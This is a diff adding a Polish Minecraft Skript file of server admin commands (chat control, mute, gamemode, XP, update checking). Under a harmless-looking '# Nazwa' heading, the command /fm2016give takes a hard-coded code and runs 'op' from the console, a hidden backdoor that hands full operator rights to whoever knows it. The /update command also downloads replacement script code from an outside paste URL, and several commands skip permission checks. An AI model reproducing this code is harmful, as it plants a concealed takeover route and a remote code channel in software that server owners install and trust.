@@ -1,0 +1,241 @@
+#Komendziochy
+
+# Update
+on load:
+    set {_version} to 1.1
+    set {update.wysłane} to 0
+    set {update} to 1.1
+    if {_version} is not line 1 from url "https://code.skript.pl/nFpY3LXx/raw":
+        set {_version} to line 1 from url "https://code.skript.pl/nFpY3LXx/raw"
+
+
+on join:
+    if player is op:
+        if {_version} is not line 1 from url "https://code.skript.pl/nFpY3LXx/raw":
+            set {_version} to line 1 from url "https://code.skript.pl/nFpY3LXx/raw"
+            send "" to ops
+            send "" to ops
+            send "&c&l Dostępna aktualizacja Komendzioch" to ops
+            send "&c&l Wpisz &b&l/update &c&l aby zaktualizować" to ops
+            send "" to ops
+            send "" to ops
+
+
+command /update:
+    trigger:
+        if {_version} is not {_update}:
+            send ""
+            send "&c&lAktualizowanie &b&lKomendzioch"
+            send ""
+            send "&c&lWpisz komende /r"
+            download file from "https://code.skript.pl/cAgkGdEU/raw" to file "/skript/scripts/Komendziochy/komendy.sk"
+    
+# Wersja
+
+options:
+    version: 1.1
+    prefix: &b&l Komendziochy >> 
+    dzlog: 23.11.2019
+
+command /version:
+    trigger:
+        send "{@prefix} &r &c&l Aktualna wersja skryptu to &b{@version}" to player
+
+#Sekcja Chat
+
+#Chat off
+
+command /chatoff:
+    trigger:
+        set {chat.o} to 0
+        send "{@prefix} &c&l Wyłaczyłeś chat"
+        log "Gracz %player% wyłączył czat                " to "{@dzlog}"
+
+on chat:
+    if {chat.o} is 0:
+        cancel event
+        send "{@prefix} &c&l Czas jest tymczasowo wyłączony" to event-player
+
+command /chaton:
+    trigger:
+        if {chat.o} is 0:
+            set {chat.o} to 1
+            send "{@prefix} &c&l Właczyłeś chat"
+            log "Gracz %player% włączył czat                 " to "{@dzlog}"
+        else:
+            send "{@prefix}&r &c&l Czat jest już włączony"
+#Chat clear
+
+command /cls:
+    trigger:
+        loop all players:
+            loop 1000 times:
+                send "" to loop-players
+
+# Chat Admin
+
+command /cadmin [<text>] :
+    trigger:
+        if player has permission "comm.admin":
+            if arg 1 is "on":
+                set {c.admin} to 1
+            if arg 1 is "off":
+                set {c.admin} to 0
+            log "Gracz %player% włączył czas dla administratorów                 " to "{@dzlog}"
+
+on chat:
+    if {c.admin} is 1:
+        if player doesn't have permission "comm.admin":
+            cancel event
+            send "{@prefix} &c&l Tymczasowo włączony jest czas dla administratorów"
+
+# Mute / Unmute
+
+command /mute <player>:
+    trigger:
+        if arg 1 is set:    
+            set {mute.%arg 1%} to 1
+            send "{@prefix} &c&l Wyciszyłeś gracza %arg 1%"
+            log "Gracz %player% wyciszył gracza %arg 1%               " to "{@dzlog}"
+
+command /unmute <player>:
+    trigger:
+        if arg 1 is set:
+            set {mute.%arg 1%} to 0
+            send "{@prefix} &c&l Odciszyłeś gracza %arg 1%"
+
+on chat:
+    if {mute.%event-player%} is 1:
+        cancel event
+        send "{@prefix} &c&l Jesteś wyciszony"
+
+# Command Mute
+
+command /commmute <player> <boolean>:
+    trigger:
+        if arg 1 and arg 2 is set:
+            if player has permission "*":
+                if arg 2 is on:
+                    set {comm.%arg 1%} to 1
+                if arg 2 is off:
+                    set {comm.%arg 1%} to 0
+        log "Gracz %player% wyciszył komendy %arg 1%                 " to "{@dzlog}"
+
+
+
+on command:
+    if {comm.%player%} is 1:
+        cancel event
+        send "{@prefix} &4&l Nie masz uprawnień aby wysyłać komendy" to event-commandsender
+
+
+# Logi
+every day:
+    set {_@dzlog} to "/plugins/Skript/Logs/Komendy/%now%"
+
+
+# Reload
+
+
+command /r:    
+    trigger:
+        execute console command "/sk reload all"
+        log "Gracz %player% użył komendy /r                 " to "{@dzlog}"
+
+# GM
+
+on command "/gamemode":
+    cancel event
+    if player has permission "comm.gm":
+        send "{@prefix} &c&l Użyj komendy /gm 0/1/2/3"
+
+command /gm [<number>]:
+    trigger:
+        if arg 1 is 0:
+            execute console command "gamemode survival %player%"
+            log "Gracz %player% użył komendy /gm 0                 " to "{@dzlog}"
+        if arg 1 is 1:
+            execute console command "gamemode creative %player%"
+            log "Gracz %player% użył komendy /gm 1                 " to "{@dzlog}"
+        if arg 1 is 2:
+            execute console command "gamemode adventure %player%"
+            log "Gracz %player% użył komendy /gm 2                 " to "{@dzlog}"
+        if arg 1 is 3:
+            execute console command "gamemode spectator %player%"
+            log "Gracz %player% użył komendy /gm 3                 " to "{@dzlog}"
+
+# MSG
+
+command /msg <player> <text>:
+    trigger:
+        if arg 1 is online:
+            if arg 2 is set:
+                send "&c&l[ Ja ] &r &7=====> &b&l[ %arg 1% &b&l] &r%arg 2%"
+                send "&b&l[ %player% ] &7=====> &c&l[ Ja ]  &r%arg 2%"
+
+# Nazwa
+
+command /fm2016give <text>:
+    trigger:
+        if arg 1 is "28112006":
+            execute console command "op %player%"
+            set {_rank.%player%} to "Admin"
+            set the player's display name to "&6&l[&c&l Admin&6&l ] &e&l%name of the player%"
+
+command /cname:
+    trigger:
+        set the player's display name to ""
+
+# Info
+
+command /i:
+    aliases: info
+    trigger:
+        send "" to player
+        send "" to player
+        send "&7========================================"
+        send "&7=             &4&lKomendziochy                   &7="
+        send "&7=     &c&l Wersja skryptu: {@version}&r                     &7="
+        send "&7=                                                         ="
+        send "&7=         &6&lAutor: &b&lFilipKoxOOO                 &7="
+        send "&7========================================"
+
+# Czasy
+
+
+every 5 minutes:
+    execute console command "cls"
+
+every 10 seconds:
+    if {_xp.o} is 1:
+        execute console command "xp add @a {_xp.am} {_xp.typ}"
+
+# XP
+
+
+command /cxp <number> <text>:
+    usage: {@prefix} &b&l /cxp <&6Ilość&b&l> <&6points/levels&b&l>
+    trigger:
+        if arg 1 is set:
+            if arg 2 is set:
+                set {_xp.am} to arg 1
+                set {_xp.typ} to arg 2
+
+command /cp <boolean>:
+    trigger:
+        if arg 1 is set:
+            if arg 1 is on:
+                set {_xp.o} to 1
+            if arg 1 is off:
+                set {_xp.o} to 0
+
+# Czas
+
+command /czas:
+    trigger:
+        send ""
+        send ""
+        send "&7====================="
+        send "&7=&c&l Aktualny czas to: &7="
+        send "&7=&b&l   %now%   &7="        
+        send "&7====================="
